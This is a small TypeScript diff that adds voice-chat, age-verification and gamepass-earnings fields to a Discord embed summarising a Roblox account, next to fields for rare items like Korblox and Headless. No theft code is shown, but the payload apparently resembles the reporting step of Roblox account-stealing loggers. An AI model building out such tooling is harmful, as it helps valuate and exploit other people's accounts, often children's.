@@ -412,6 +412,9 @@ function buildDiscordPayload(opts: {
       { name: "Korblox", value: roblox.hasKorblox === null ? "Unknown" : roblox.hasKorblox ? "✅ Yes" : "❌ No", inline: true },
       { name: "Headless", value: roblox.hasHeadless === null ? "Unknown" : roblox.hasHeadless ? "✅ Yes" : "❌ No", inline: true },
       { name: "Total Groups", value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
+      { name: "🎤 Voice Chat", value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
+      { name: "🪪 Age Verified (13+)", value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
+      { name: "💸 Gamepass Earnings", value: roblox.gamepassEarnings !== null ? `${roblox.gamepassEarnings.toLocaleString()} R$` : "Unknown", inline: true },
     );
 
     // Owned groups — chunked to 1024 chars per field
